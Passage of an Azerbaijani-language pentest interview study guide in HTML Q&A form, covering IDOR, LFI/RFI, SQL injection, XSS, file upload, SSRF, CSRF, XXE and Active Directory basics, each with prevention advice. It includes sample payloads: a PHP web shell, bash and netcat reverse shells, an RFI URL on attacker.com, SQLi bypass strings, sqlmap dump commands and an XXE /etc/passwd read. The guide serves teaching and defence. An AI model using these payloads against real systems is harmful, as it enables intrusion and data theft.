+<div class="qa-q"><span class="badge">Sual 64</span><h3>IDOR-un qarşısı necə alınır?</h3></div>
+<div class="qa-a">
+<ul class="blist">
+<li>Server-side authorization – əsas yoxlama backend-də olmalıdır (owner yoxlaması).</li>
+<li>Object-level authorization – hər object üçün “bu user buna baxa bilərmi?” yoxla.</li>
+<li>Reference Map – raw ID əvəzinə token/mapping istifadə et (/order?token=as9d8as7d9).</li>
+</ul>
+</div></article>
+<article class="qa" id="q65">
+<div class="qa-q"><span class="badge">Sual 65</span><h3>Token nədir və necə işləyir?</h3></div>
+<div class="qa-a">
+<p>Token – sistemin səni tanımaq üçün verdiyi “rəqəmsal bilet”dir. Login olursan, sistem token verir, sonrakı hər request-də o token ilə özünü tanıdırsan (Authorization: Bearer ...).</p>
+<h4 class="sub">Token nə saxlaya bilər?</h4>
+<ul class="blist">
+<li>user ID</li>
+<li>username</li>
+<li>role (admin/user)</li>
+<li>expiration (vaxt limiti)</li>
+</ul>
+<h4 class="sub">Növləri</h4>
+<ul class="blist">
+<li>Session token – server yadda saxlayır, cookie ilə gəlir.</li>
+<li>JWT (JSON Web Token) – token özü məlumat daşıyır (header.payload.signature).</li>
+</ul>
+<p>Risklər: zəif token guess edilə bilər, expire olmur, signature yoxlanmır → account takeover, IDOR + privilege escalation.</p>
+</div></article>
+<article class="qa" id="q66">
+<div class="qa-q"><span class="badge">Sual 66</span><h3>Path Traversal və LFI nədir, fərqi nədir?</h3></div>
+<div class="qa-a">
+<p>Path Traversal – serverdə qovluqlar arasında “geri gedərək” (../../../) istədiyin fayla çatmaq (məs: /download?file=../../../../etc/passwd).</p>
+<p>LFI (Local File Inclusion) – server bir faylı “include” edir və sən bunu manipulyasiya edirsən (məs: ?page=../../../../etc/passwd; include($_GET[&#x27;page&#x27;])).</p>
+<ul class="blist">
+<li>Path Traversal = path (yol) manipulyasiyası; faylı oxumaq.</li>
+<li>LFI = file include mexanizmini exploit etmək; faylı daxil etdirmək (çox vaxt PHP-də).</li>
+</ul>
+<p>Sadə dillə: LFI faylı run etməyə çalışır (run edilə bilirsə icra edir, yoxsa içini oxuyur); Path Traversal isə yalnız oxumaq üçündür.</p>
+</div></article>
+<article class="qa" id="q67">
+<div class="qa-q"><span class="badge">Sual 67</span><h3>RFI nədir və LFI-dən fərqi nədir?</h3></div>
+<div class="qa-a">
+<p>RFI (Remote File Inclusion) – serverə uzaq (remote) serverdə olan faylı daxil etdirmək (məs: ?page=http://attacker.com/shell.php). Server faylı çəkir və işlədir → birbaşa RCE.</p>
+<ul class="blist">
+<li>LFI: fayl serverin özündən gəlir; risk yüksək, bəzən RCE.</li>
+<li>RFI: fayl xarici serverdən gəlir; risk çox yüksək, demək olar birbaşa RCE.</li>
+</ul>
+<p>Qeyd: “rfi url not allowed” mesajı – GET ilə qarşısı alınıb; POST yoxlamaq lazım ola bilər.</p>
+</div></article>
+<article class="qa" id="q68">
+<div class="qa-q"><span class="badge">Sual 68</span><h3>BOLA, RB, RBAC, ABAC, MFLAC nədir?</h3></div>
+<div class="qa-a">
+<ul class="blist">
+<li>BOLA (Broken Object Level Authorization) – sistem obyekt səviyyəsində access-i düzgün yoxlamır (IDOR-un API dünyasındakı adı).</li>
+<li>RB (Role Based) – “Sənin rolun nədir?” (Admin → hər şey, User → normal funksiyalar).</li>
+<li>RBAC (Role Based Access Control) – User → Role → Permissions; insana yox, role icazə verilir.</li>
+<li>ABAC (Attribute Based Access Control) – atributlara/şərtlərə görə qərar (user kimdir, haradandır, nə vaxt, hansı resource).</li>
+<li>MFLAC (Missing Function Level Access Control) – function-level check yoxdur; qadağan əməliyyat işləyir (məs: POST /admin/deleteUser yoxlanmır).</li>
+</ul>
+<p>Qısa: RB = kim; RBAC = hansı roldasan; ABAC = vəziyyətə görə qərar; MFLAC = check yoxdur. Rule-based RBAC = role + əlavə qaydalar.</p>
+</div></article>
+<article class="qa" id="q69">
+<div class="qa-q"><span class="badge">Sual 69</span><h3>Log Poisoning və PHP Wrappers nədir?</h3></div>
+<div class="qa-a">
+<p>Log Poisoning – serverin log fayllarına zərərli kod yazdırmaq və sonra o log-u icra etdirmək. Təkbaşına işləməz; mütləq başqa zəifliklə (adətən LFI) birlikdə olur.</p>
+<p>PHP Wrapper – PHP-nin fayllarla işləmək üçün verdiyi xüsusi mexanizmlərdir (“necə oxuyum?” deyən mexanizm).</p>
+<ul class="blist">
+<li>php://input – POST datasını oxumaq.</li>
+<li>php://filter – faylı decode/encode etmək.</li>
+<li>data:// – kod/data birbaşa ötürmək.</li>
+<li>file:// – local fayl oxumaq.</li>
+</ul>
+<p>Log Poisoning vs PHP Wrapper: Log Poisoning log faylına yazılır, LFI + writable log lazımdır, disk izi var, stealth orta. PHP Wrapper birbaşa memory-də işləyir, LFI + wrapper açıq lazımdır, disk izi yoxdur, stealth yüksək. Hər ikisinin RCE potensialı yüksəkdir.</p>
+</div></article>
+<article class="qa" id="q70">
+<div class="qa-q"><span class="badge">Sual 70</span><h3>SQL Injection (SQLi) nədir?</h3></div>
+<div class="qa-a">
+<p>SQL database ilə danışmaq üçün istifadə olunan dildir. SQL Injection – attacker-in input vasitəsilə SQL query-ni dəyişməsidir.</p>
+<p>Klassik login bypass nümunəsi: username = admin&#x27;-- → query: SELECT * FROM users WHERE username=&#x27;admin&#x27; --&#x27; AND password=&#x27;...&#x27;. -- SQL-də comment olduğu üçün password hissəsi ignore olunur və login bypass olur.</p>
+</div></article>
+<article class="qa" id="q71">
+<div class="qa-q"><span class="badge">Sual 71</span><h3>Ən çox istifadə olunan SQL portları hansılardır?</h3></div>
+<div class="qa-a">
+<ul class="blist">
+<li>3306 – MySQL.</li>
+<li>5432 – PostgreSQL.</li>
+<li>1433 – Microsoft SQL Server.</li>
+<li>1521 – Oracle Database (2483 TCP, 2484 TCPS).</li>
+<li>27017 – MongoDB (NoSQL).</li>
+<li>6379 – Redis (key-value).</li>
+<li>9042 – Cassandra.</li>
+<li>50000 – IBM DB2.</li>
+<li>3050 – Firebird SQL.</li>
+<li>21000 – SAP HANA.</li>
+</ul>
+<p>Nümunə nmap: nmap -p 1433,3306,5432,1521 target_ip</p>
+</div></article>
+<article class="qa" id="q72">
+<div class="qa-q"><span class="badge">Sual 72</span><h3>MySQL-də ən çox istifadə olunan SQLi funksiyaları hansılardır?</h3></div>
+<div class="qa-a">
+<h4 class="sub">Info funksiyaları</h4>
+<ul class="blist">
+<li>version(), @@version – DB versiyası</li>
+<li>database() – cari DB adı</li>
+<li>user() – cari istifadəçi</li>
+<li>@@hostname – host adı</li>
+<li>@@datadir – data yolu</li>
+</ul>
+<h4 class="sub">Struktur (information_schema)</h4>
+<ul class="blist">
+<li>information_schema.schemata – bütün databazalar</li>
+<li>information_schema.tables – cədvəllər</li>
+<li>information_schema.columns – sütunlar</li>
+</ul>
+<h4 class="sub">String / time funksiyaları</h4>
+<ul class="blist">
+<li>concat(), group_concat() – nəticələri yan-yana yazmaq.</li>
+<li>IF(), CASE WHEN – şərt əsaslı (blind/timing).</li>
+<li>SLEEP(), BENCHMARK() – time-based blind.</li>
+<li>SUBSTRING(), LENGTH() – simvolları bir-bir tapmaq.</li>
+<li>load_file() – fayl oxuma (tez bloklanır, secure_file_priv).</li>
+</ul>
+<p>MySQL “4+3 qaydası”: 4 info – version(), database(), user(), @@hostname; 3 string/time – concat()/group_concat(), length()/substring(), sleep().</p>
+</div></article>
+<article class="qa" id="q73">
+<div class="qa-q"><span class="badge">Sual 73</span><h3>SQLi növləri hansılardır?</h3></div>
+<div class="qa-a">
+<ul class="blist">
+<li>Error-Based – qəsdən SQL səhvi yaradılır, DB içində məlumat olan error mesajı qaytarır (updatexml, extractvalue, CONVERT, CAST).</li>
+<li>UNION-Based – UNION SELECT ilə başqa cədvəllərdən məlumat çıxarılır, nəticə səhifədə görünür (sütun sayı və tip uyğun olmalıdır).</li>
+<li>Boolean-Based Blind – data görünmür, yalnız true/false fərqi (&#x27; AND 1=1-- vs &#x27; AND 1=2--).</li>
+<li>Time-Based Blind – cavab gecikməsi ilə (&#x27; AND SLEEP(5)--).</li>
+<li>Out-Of-Band (OOB) – database başqa serverə request göndərir (LOAD_FILE, DNS exfiltration).</li>
+</ul>
+</div></article>
+<article class="qa" id="q74">
+<div class="qa-q"><span class="badge">Sual 74</span><h3>Bir saytda SQLi olub-olmadığını necə anlayırıq?</h3></div>
+<div class="qa-a">
+<h4 class="sub">Haraları yoxlamaq?</h4>
+<ul class="blist">
+<li>Search hissəsi</li>
+<li>Login formu</li>
+<li>Filter parametrləri</li>
+<li>ID ilə açılan səhifələr</li>
+<li>GET/POST parametrləri</li>
+<li>API endpoint-lər</li>
+</ul>
+<h4 class="sub">Testlər</h4>
+<ul class="blist">
+<li>Error test: ?id=5&#x27; → “You have an error in your SQL syntax”, “Unclosed quotation mark”, “SQLSTATE”, “ORA-”, “PG::” → SQLi əlaməti.</li>
+<li>Boolean test: ?id=5 AND 1=1 vs ?id=5 AND 1=2 → nəticə fərqlənirsə.</li>
+<li>ORDER BY test: ?id=5 ORDER BY 1.. → birdən error → sütun sayını keçdin.</li>
+<li>Time-based test: ?id=5 AND SLEEP(5)-- → səhifə 5 saniyə gecikirsə.</li>
+</ul>
+<p>Prinsip: Response dəyişir → Boolean; Error çıxır → Error-based; Data görünür → UNION; Sadəcə gecikir → Time-based.</p>
+</div></article>
+<article class="qa" id="q75">
+<div class="qa-q"><span class="badge">Sual 75</span><h3>SQLi exploitation və tools necədir?</h3></div>
+<div class="qa-a">
+<p>SQLi tapıldıqdan sonra ardıcıllıq: Database name → Tables → Columns → Data.</p>
+<ul class="blist">
+<li>Database: &#x27; UNION SELECT database()--</li>
+<li>Table: information_schema.tables</li>
+<li>Column: information_schema.columns</li>
+<li>Data dump: username, password, email</li>
+</ul>
+<h4 class="sub">SQLMAP</h4>
+<ul class="blist">
+<li>sqlmap -u &quot;http://site.com?id=1&quot; --dbs</li>
+<li>sqlmap -u URL --tables</li>
+<li>sqlmap -u URL --dump</li>
+</ul>
+</div></article>
+<article class="qa" id="q76">
+<div class="qa-q"><span class="badge">Sual 76</span><h3>SQL Injection-un qarşısı necə alınır?</h3></div>
+<div class="qa-a">
+<ul class="blist">
+<li>Prepared Statements (SELECT * FROM users WHERE username = ?).</li>
+<li>Input validation.</li>
+<li>WAF (Web Application Firewall).</li>
+<li>ORM istifadə etmək.</li>
+</ul>
+</div></article>
+<article class="qa" id="q77">
+<div class="qa-q"><span class="badge">Sual 77</span><h3>XSS (Cross-Site Scripting) nədir?</h3></div>
+<div class="qa-a">
+<p>XSS – veb tətbiqlərində hücumçunun başqa istifadəçilərin brauzerində script (adətən JavaScript) işlətməsidir. Bu hücum serveri deyil, istifadəçinin brauzerini hədəf alır.</p>
+<p>Necə işləyir: sayt istifadəçinin daxil etdiyi məlumatı filtr etmədən səhifədə göstərirsə, hücumçu ora script yerləşdirə bilər (məs: &lt;script&gt;alert(1)&lt;/script&gt;).</p>
+<h4 class="sub">XSS ilə nə etmək olar?</h4>
+<ul class="blist">
+<li>Cookie oğurlamaq (session hijacking).</li>
+<li>Hesabı ələ keçirmək.</li>
+<li>Keylogger yerləşdirmək.</li>
+<li>Fake login səhifəsi göstərmək.</li>
+</ul>
+</div></article>
+<article class="qa" id="q78">
+<div class="qa-q"><span class="badge">Sual 78</span><h3>XSS növləri hansılardır?</h3></div>
+<div class="qa-a">
+<ul class="blist">
+<li>Stored XSS (Persistent) – zərərli script serverdə (DB) saxlanılır, hər istifadəçi səhifəni açanda işləyir. Ən təhlükəlidir (avtomatik yayılır, admin də təsirlənir).</li>
+<li>Reflected XSS – script saxlanmır, URL vasitəsilə geri qaytarılır (site.com/search?q=&lt;script&gt;...). Phishing, email link, social engineering-də.</li>
+<li>DOM-Based XSS – zəiflik serverdə deyil, JavaScript DOM manipulyasiyasındadır (document.write(location.hash)).</li>
+</ul>
+</div></article>
+<article class="qa" id="q79">
+<div class="qa-q"><span class="badge">Sual 79</span><h3>XSS-in qarşısı necə alınır?</h3></div>
+<div class="qa-a">
+<ul class="blist">
+<li>Input sanitization / HTML escape (&lt; → &amp;lt;, &gt; → &amp;gt;).</li>
+<li>Content Security Policy (CSP) header.</li>
+<li>HttpOnly cookie (JavaScript cookie-ni oxuya bilməz).</li>
+<li>Framework protection (React/Angular avtomatik escape edir).</li>
+</ul>
+<p>XSS vs SQLi: XSS hədəfi browser, dili JavaScript, nəticə script işləyir; SQLi hədəfi database, dili SQL, nəticə DB məlumatı çıxır.</p>
+</div></article>
+<article class="qa" id="q80">
+<div class="qa-q"><span class="badge">Sual 80</span><h3>File Upload zəifliyi nədir və bypass texnikaları hansılardır?</h3></div>
+<div class="qa-a">
+<p>File Upload zəifliyi – fayl yükləmə funksiyasının düzgün qorunmaması nəticəsində hücumçunun serverə zərərli fayl (məs: web shell) yükləyib sistemi ələ keçirməsidir.</p>
+<p>Klassik hücum: shell.php (içində &lt;?php system($_GET[&#x27;cmd&#x27;]); ?&gt;) yüklənir, sonra site.com/uploads/shell.php?cmd=id açılır.</p>
+<h4 class="sub">Bypass texnikaları</h4>
+<ul class="blist">
+<li>Extension bypass (shell.php).</li>
+<li>Double extension (shell.php.jpg).</li>
+<li>Alternative PHP extensions (.phtml, .php5, .phar, .pht).</li>
+<li>MIME type bypass (Content-Type: image/jpeg).</li>
+<li>Magic bytes bypass (FF D8 FF + PHP kodu).</li>
+<li>Case bypass (shell.pHp).</li>
+<li>Null byte injection (shell.php%00.jpg – köhnə PHP).</li>
+<li>Polyglot files (GIF89a; + PHP).</li>
+<li>Image metadata injection (exiftool).</li>
+<li>Upload path manipulation (../../../shell.php).</li>
+<li>ZIP upload + extraction, overwrite attack, race condition upload.</li>
+</ul>
+</div></article>
+<article class="qa" id="q81">
+<div class="qa-q"><span class="badge">Sual 81</span><h3>File Upload zəifliyinin qarşısı və .htaccess nədir?</h3></div>
+<div class="qa-a">
+<h4 class="sub">Qarşısının alınması</h4>
+<ul class="blist">
+<li>Yalnız whitelist extension.</li>
+<li>MIME type check.</li>
+<li>Faylı random adla saxla.</li>
+<li>Upload qovluğu executable olmasın.</li>
+<li>Faylı image processing-dən keçirt.</li>
+</ul>
+<p>.htaccess – Apache web server konfiqurasiya faylıdır; yerləşdiyi qovluqda server davranışını dəyişə bilir (hansı extension PHP kimi işləsin, access qaydaları, redirectlər). Apache qovluqda .htaccess görəndə onu oxuyur və tətbiq edir.</p>
+<p>Impact: RCE, server takeover, database access, reverse shell, privilege escalation → Critical.</p>
+</div></article>
+<article class="qa" id="q82">
+<div class="qa-q"><span class="badge">Sual 82</span><h3>Web shell və reverse shell texnikaları hansılardır?</h3></div>
+<div class="qa-a">
+<h4 class="sub">Web shell növləri</h4>
+<ul class="blist">
+<li>PHP: &lt;?php system($_GET[&#x27;cmd&#x27;]); ?&gt;</li>
+<li>Bash: bash -i</li>
+<li>Python: python -c &#x27;import socket&#x27;</li>
+</ul>
+<h4 class="sub">Reverse shell</h4>
+<ul class="blist">
+<li>Bash: bash -i &gt;&amp; /dev/tcp/IP/PORT 0&gt;&amp;1</li>
+<li>Netcat: nc -e /bin/bash IP PORT</li>
+<li>Netcat mkfifo: mkfifo /tmp/f; nc IP PORT &lt; /tmp/f | /bin/bash &gt; /tmp/f</li>
+<li>Python / PHP / Perl variantları.</li>
+</ul>
+<p>Reverse shell portları: 4444, 9001, 1337, 8080, 443, 53 (443 firewall bypass üçün).</p>
+</div></article>
+<article class="qa" id="q83">
+<div class="qa-q"><span class="badge">Sual 83</span><h3>Web pentest attack chain və alətlər hansılardır?</h3></div>
+<div class="qa-a">
+<p>Tipik ardıcıllıq: Information Gathering → Directory Enumeration → Parameter Discovery → SQL Injection → XSS → Authentication Bypass → File Upload → RCE → Reverse Shell → Privilege Escalation.</p>
+<h4 class="sub">Post-exploitation</h4>
+<ul class="blist">
+<li>id, whoami, sudo -l</li>
+<li>linpeas, ps aux, cron jobs, SUID files</li>
+</ul>
+<h4 class="sub">Pentester toolset</h4>
+<ul class="blist">
+<li>Burp Suite, sqlmap</li>
+<li>ffuf, gobuster, feroxbuster</li>
+<li>nikto, wpscan</li>
+<li>linpeas, pspy</li>
+</ul>
+</div></article>
+<article class="qa" id="q84">
+<div class="qa-q"><span class="badge">Sual 84</span><h3>SSRF nədir və növləri hansılardır?</h3></div>
+<div class="qa-a">
+<p>SSRF (Server-Side Request Forgery) – hücumçunun serverə öz istədiyi URL-ə request göndərməyə məcbur etməsidir. Normalda server özü request edir, amma attacker bunu manipulyasiya edir (məs: ?url=http://127.0.0.1:22).</p>
+<h4 class="sub">Niyə təhlükəlidir?</h4>
+<ul class="blist">
+<li>Localhost (127.0.0.1) access</li>
+<li>Internal IP-lər (192.168.x.x, 10.x.x.x)</li>
+<li>Cloud metadata (AWS, GCP, Azure)</li>
+<li>Internal admin panel</li>
+</ul>
+<h4 class="sub">Növləri</h4>
+<ul class="blist">
+<li>Basic SSRF – sadə URL parametri.</li>
+<li>Blind SSRF – response görmürsən (Burp Collaborator, Interactsh).</li>
+<li>Semi-Blind SSRF – response yoxdur amma fərqli davranış (timeout, error).</li>
+<li>Filter Bypass SSRF.</li>
+<li>SSRF via File Upload, via XXE, via Open Redirect.</li>
+</ul>
+</div></article>
+<article class="qa" id="q85">
+<div class="qa-q"><span class="badge">Sual 85</span><h3>SSRF necə exploit edilir və qarşısı necə alınır?</h3></div>
+<div class="qa-a">
+<h4 class="sub">Attack taktikaları</h4>
+<ul class="blist">
+<li>Internal scan (http://127.0.0.1:80, :22).</li>
+<li>Cloud metadata (http://169.254.169.254/latest/meta-data/ → IAM credentials).</li>
+<li>Service enumeration (Redis 6379, Docker API 2375, Jenkins, Kibana).</li>
+<li>RCE chain (SSRF → internal service → misconfig → RCE).</li>
+<li>Credential theft (API keys, tokens, secrets).</li>
+</ul>
+<h4 class="sub">Payload texnikaları</h4>
+<ul class="blist">
+<li>IP bypass: 127.0.0.1, localhost, 0.0.0.0, 2130706433, 0177.0.0.1</li>
+<li>Protocol abuse: file://, gopher://, dict://, ftp://</li>
+<li>Gopher (advanced): raw TCP request</li>
+</ul>
+<h4 class="sub">Qorunma</h4>
+<ul class="blist">
+<li>Blacklist YOX, Whitelist istifadə et</li>
+<li>URL parsing düzgün et (DNS resolve, IP check)</li>
+<li>Internal IP-ləri blokla (127.0.0.0/8, 10.0.0.0/8, 169.254.169.254)</li>
+<li>Cloud: metadata access disable, IMDSv2 (AWS)</li>
+<li>Firewall: outbound request limit</li>
+</ul>
+</div></article>
+<article class="qa" id="q86">
+<div class="qa-q"><span class="badge">Sual 86</span><h3>Open Redirect nədir və SSRF bypass-da necə işləyir?</h3></div>
+<div class="qa-a">
+<p>Open Redirect – saytın istifadəçini istənilən URL-ə yönləndirməsinə icazə verməsidir (məs: /redirect?url=http://evil.com server yoxlamadan yönləndirir).</p>
+<p>Tək başına: phishing, token oğurlama (low/medium risk). Real gücü SSRF bypass-da çıxır.</p>
+<h4 class="sub">SSRF bypass məntiqi</h4>
+<p>Sistem internal IP-ləri bloklayır, amma trusted domain-ə icazə verir. Trusted domain-də open redirect tapırsan və chain qurursan: ?url=https://trusted.com/redirect?url=http://127.0.0.1 → server redirect-i follow edir → SSRF bypass.</p>
+<h4 class="sub">Open Redirect növləri</h4>
+<ul class="blist">
+<li>Parametr-based (?url=, ?redirect=, ?next=, ?return=)</li>
+<li>Path-based (/redirect/http://evil.com)</li>
+<li>Header-based (Location: user_input)</li>
+<li>DOM-based (window.location)</li>
+</ul>
+<p>Qorunma: redirect URL whitelist, external redirect disable, server tərəfində redirect follow disable, strict URL parsing.</p>
+<p>Qızıl qayda: SSRF = hücumun özü; Open Redirect = hücum üçün alət.</p>
+</div></article>
+<article class="qa" id="q87">
+<div class="qa-q"><span class="badge">Sual 87</span><h3>SSRF və Open Redirect arasında əsas fərq nədir?</h3></div>
+<div class="qa-a">
+<ul class="blist">
+<li>Harada işləyir: SSRF server tərəfdə; Open Redirect client (browser) tərəfdə.</li>
+<li>Kim request edir: SSRF-də server; Open Redirect-də istifadəçi (browser).</li>
+<li>Nə verir: SSRF internal network access; Open Redirect sadəcə yönləndirmə.</li>
+<li>Risk: SSRF Critical; Open Redirect Low → Medium.</li>
+<li>Exploit: SSRF internal scan/metadata; Open Redirect phishing/chain attack.</li>
+</ul>
+<p>Vizual: SSRF → Attacker → Server → Internal System; Open Redirect → Attacker → User → Redirect → Evil site.</p>
+</div></article>
+<article class="qa" id="q88">
+<div class="qa-q"><span class="badge">Sual 88</span><h3>CSRF nədir və qarşısı necə alınır?</h3></div>
+<div class="qa-a">
+<p>CSRF (Cross-Site Request Forgery) – istifadəçinin xəbəri olmadan, onun autentifikasiya olunmuş sessiyası vasitəsilə serverə saxta sorğu göndərilməsidir.</p>
+<p>Necə işləyir: user login olur, browser session cookie-ni avtomatik saxlayır; attacker istifadəçini hazırlanmış sayta yönləndirir; browser cookie ilə request göndərir; server bunu legitim sorğu kimi qəbul edir.</p>
+<h4 class="sub">Yaranma səbəbi</h4>
+<ul class="blist">
+<li>Server yalnız cookie-yə güvənir</li>
+<li>Request mənbəyi yoxlanmır (Origin/Referer)</li>
+<li>CSRF token yoxdur</li>
+</ul>
+<h4 class="sub">Qarşısının alınması</h4>
+<ul class="blist">
+<li>CSRF Token (hər request üçün unikal token, ən effektiv).</li>
+<li>SameSite cookie flag (Strict/Lax).</li>
+<li>Origin/Referer yoxlanışı.</li>
+<li>Kritik əməliyyatlarda şifrə və ya OTP soruşmaq (re-authentication).</li>
+</ul>
+</div></article>
+<article class="qa" id="q89">
+<div class="qa-q"><span class="badge">Sual 89</span><h3>Session və Cookie nədir?</h3></div>
+<div class="qa-a">
+<p>Session – istifadəçinin login olduqdan sonra server tərəfindən verilən unikal identifikatordur. Login → server Set-Cookie: session=abc123 verir → sonrakı request-lərdə server bu ID ilə istifadəçini tanıyır.</p>
+<h4 class="sub">Session expiration</h4>
+<ul class="blist">
+<li>Short (secure): 5–15 dəqiqə</li>
+<li>Normal: 30–60 dəqiqə</li>
+<li>Long (remember me): günlər</li>
+</ul>
+<h4 class="sub">Session security</h4>
+<ul class="blist">
+<li>HttpOnly cookie</li>
+<li>Secure flag (HTTPS only)</li>
+<li>Session rotation</li>
+<li>Timeout, logout-da silmə</li>
+</ul>
+<p>Cookie – istifadəçi haqqında məlumatı brauzerdə saxlayan kiçik məlumat parçalarıdır (session saxlamaq, ayarlar, tracking). Növləri: Session cookie (browser bağlananda silinir), Persistent cookie (expiry date var).</p>
+</div></article>
+<article class="qa" id="q90">
+<div class="qa-q"><span class="badge">Sual 90</span><h3>Cookie hansı parametrlərə görə fərqlənir (təhlükəsizlik baxımından)?</h3></div>
+<div class="qa-a">
+<ul class="blist">
+<li>Name &amp; Value – session ID burada (predictable/brute force/decode riski).</li>
+<li>Domain – cookie hansı domain üçün keçərlidir (.example.com → subdomain riski).</li>
+<li>Path – hansı URL path üçün göndərilir.</li>
+<li>Secure – yalnız HTTPS üzərindən (yoxdursa MITM riski).</li>
+<li>HttpOnly – JavaScript oxuya bilmir (yoxdursa XSS ilə oğurlanır).</li>
+<li>SameSite (Strict/Lax/None) – None CSRF üçün ideal hədəf.</li>
+<li>Expires / Max-Age – cookie ömrü (uzun müddət → session hijack).</li>
+<li>Priority – browser hansı cookie-ni üstün tutacaq.</li>
+</ul>
+</div></article>
+<article class="qa" id="q91">
+<div class="qa-q"><span class="badge">Sual 91</span><h3>Clickjacking nədir və qarşısı necə alınır?</h3></div>
+<div class="qa-a">
+<p>Clickjacking – istifadəçini aldatmaqla, görünməyən və ya gizlədilmiş elementlər üzərindən klik etdirmə hücumudur. User görmədən klik edir, əslində başqa şeyə klikləyir.</p>
+<p>Necə işləyir: attacker səhifəyə şəffaf iframe yerləşdirir, üstünə saxta UI qoyur; istifadəçi klik edəndə iframe içindəki action trigger olur.</p>
+<h4 class="sub">Qarşısının alınması</h4>
+<ul class="blist">
+<li>X-Frame-Options: DENY</li>
+<li>Content-Security-Policy: frame-ancestors &#x27;none&#x27;</li>
+<li>SameSite cookie (dolayı)</li>
+<li>Kritik əməliyyatlarda əlavə təsdiq</li>
+</ul>
+<p>CSRF vs Clickjacking: CSRF gizli request (istifadəçi passiv, token yoxluğu); Clickjacking UI aldatma (istifadəçi aktiv, iframe icazəsi).</p>
+</div></article>
+<article class="qa" id="q92">
+<div class="qa-q"><span class="badge">Sual 92</span><h3>XXE nədir və necə işləyir?</h3></div>
+<div class="qa-a">
+<p>XXE (XML External Entity) – XML parser-in zəif konfiqurasiyası nəticəsində hücumçunun serverə xarici fayl oxutması və ya request etdirməsidir. Server XML qəbul edir → sən XML içində “external entity” yazırsan → server onu icra edir.</p>
+<p>DTD = XML-in qaydaları (ENTITY-lər burada yazılır). ENTITY = XML-də dəyişən kimi işləyən obyekt.</p>
+<h4 class="sub">Basic payload</h4>
+<pre class="code"><code>&lt;!DOCTYPE test [ &lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt; ]&gt;  &lt;user&gt;&lt;name&gt;&amp;xxe;&lt;/name&gt;&lt;/user&gt;</code></pre>
+<h4 class="sub">XXE ilə nə etmək olar?</h4>
+<ul class="blist">
+<li>File Read (file:///etc/passwd).</li>
+<li>SSRF (http://127.0.0.1/admin).</li>
+<li>Port scanning.</li>
+<li>Remote file load (xarici DTD).</li>
+<li>RCE (bəzi hallarda – Java, PHP wrapper-lar).</li>
+</ul>
+</div></article>
+<article class="qa" id="q93">
+<div class="qa-q"><span class="badge">Sual 93</span><h3>XXE növləri hansılardır?</h3></div>
+<div class="qa-a">
+<ul class="blist">
+<li>In-Band (Classic) – nəticə response-da görünür.</li>
+<li>Blind XXE – response gəlmir, amma backend-də entity işləyir (Burp Collaborator).</li>
+<li>Out-of-Band (OOB) – data HTTP/DNS ilə attacker-ə çıxır (external DTD).</li>
+<li>File Retrieval – serverdən fayl oxuma (/etc/passwd, /etc/shadow, win.ini).</li>
+<li>SSRF via XXE – serveri özünə request etdirmək.</li>
+<li>Parameter Entity XXE (% entity) – advanced, blind exploit.</li>
+<li>External DTD XXE – payload xarici fayldadır (WAF bypass).</li>
+<li>XInclude XXE – DOCTYPE block olmasa belə exploit.</li>
+<li>XXE via File Upload (SVG, XML).</li>
+<li>Billion Laughs (DoS XXE) – serveri overload edir (RAM crash).</li>
+</ul>
+</div></article>
+<article class="qa" id="q94">
+<div class="qa-q"><span class="badge">Sual 94</span><h3>XXE necə tapılır və qarşısı necə alınır?</h3></div>
+<div class="qa-a">
+<h4 class="sub">Tapılması</h4>
+<ul class="blist">
+<li>Content-Type: application/xml</li>
+<li>Request body XML-dir</li>
+<li>Response dəyişir</li>
+<li>Burp ilə: request tut → XML-ə çevir → payload inject → Repeater test</li>
+</ul>
+<h4 class="sub">Qorunma</h4>
+<ul class="blist">
+<li>External entity processing disable</li>
+<li>DTD disable</li>
+<li>Məs (Java): factory.setFeature(&quot;http://apache.org/xml/features/disallow-doctype-decl&quot;, true)</li>
+</ul>
+<p>Attack chain: XXE → SSRF → Internal service → RCE. XXE vs SSRF: XXE XML əsaslı/parser exploit/file read edə bilir; SSRF HTTP əsaslı/server request.</p>
+</div></article>
+</section>
+<section class="cat-section" id="cat6">
+<header class="cat-head"><span class="cat-head-num">06</span><h2>Active Directory (AD)</h2></header>
+<article class="qa" id="q95">
+<div class="qa-q"><span class="badge">Sual 95</span><h3>Active Directory (AD) nədir və nəyi idarə edir?</h3></div>
+<div class="qa-a">
+<p>Active Directory (AD) – Microsoft tərəfindən yaradılmış mərkəzləşdirilmiş identifikasiya və idarəetmə sistemidir. Sadə dillə: şirkətdə bütün istifadəçiləri, kompüterləri və resursları bir mərkəzdən idarə edən sistemdir.</p>
+<h4 class="sub">Nəyi idarə edir?</h4>
+<ul class="blist">
+<li>User-lər</li>
+<li>Computer-lər</li>
+<li>Printer-lər</li>
+<li>File server-lər</li>
+<li>Permission-lar (icazələr)</li>
+</ul>
+<p>Əsas komponent: Domain Controller (DC) – AD serveridir, login request-lərini yoxlayır, istifadəçiləri autentifikasiya edir (əsasən Kerberos ilə).</p>
+</div></article>
+<article class="qa" id="q96">
+<div class="qa-q"><span class="badge">Sual 96</span><h3>Forest, Tree, Domain, Child Domain nədir?</h3></div>
+<div class="qa-a">
+<ul class="blist">
+<li>Forest (Meşə) – bütün AD mühitinin ən üst səviyyəsi; bir neçə domain və tree-ni saxlayır, trust avtomatik olur, eyni schema/config paylaşır.</li>
+<li>Tree (Ağac) – eyni namespace (domain adı) paylaşan domain-lər (company.com, it.company.com, hr.company.com).</li>
+<li>Domain – AD-in əsas idarə vahidi; user-lər, kompüterlər, policies burada.</li>
+<li>Child Domain – parent domain-in alt domain-i (it.company.com); parent ilə avtomatik trust.</li>
+</ul>
+<p>Pentest baxışı: child domain compromise → parent domain attack; trust abuse → lateral movement; forest trust → bütün şirkətə yayılma.</p>
+</div></article>
+<article class="qa" id="q97">
+<div class="qa-q"><span class="badge">Sual 97</span><h3>Domain əslində nədir (rolları)?</h3></div>
+<div class="qa-a">
+<p>Domain – həm idarə vahidi, həm təhlükəsizlik sərhədi, həm də identifikasiya sistemidir.</p>
+<ul class="blist">
+<li>İdarə vahidi – user/computer yaradılır, adminlər idarə edir.</li>
+<li>Security Boundary – öz user database-i, authentication və access control-u var.</li>
+<li>Authentication mərkəzi – login, password yoxlama, Kerberos ticket (DC edir).</li>
+<li>Resource idarəsi – fayl server, printer, network resursları domain üzərindən.</li>
+</ul>
+</div></article>
+<article class="qa" id="q98">
+<div class="qa-q"><span class="badge">Sual 98</span><h3>OU (Organizational Unit) nədir?</h3></div>
+<div class="qa-a">
